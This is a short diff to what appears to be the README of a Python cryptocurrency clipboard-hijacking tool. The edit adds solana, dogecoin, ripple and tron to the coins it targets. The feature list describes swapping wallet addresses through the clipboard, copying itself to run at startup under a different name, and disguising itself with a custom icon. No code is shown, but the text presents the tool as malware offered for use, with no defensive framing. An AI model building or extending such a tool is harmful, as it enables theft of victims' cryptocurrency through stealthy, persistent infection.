@@ -681,7 +681,7 @@ subprocess - uses powershell to retrieve clipboard text and uses powershell to s
 pyperclip - uses the pyperclip package to retrieve and set clipboard text - pyperclip install needed meaning this will only work on windows computers with pyperclip installed through pip install pyperclip.
 
 Features:
-    -supports bitcoin, ethereum, litecoin, monero.
+    -supports bitcoin, ethereum, litecoin, monero, solana, dogecoin, ripple, tron.
     -has single use method meaning after one log the code wont run again.
     -duplicates itself to run at startup with a different name.
     -can a add custom icon as .ico file.
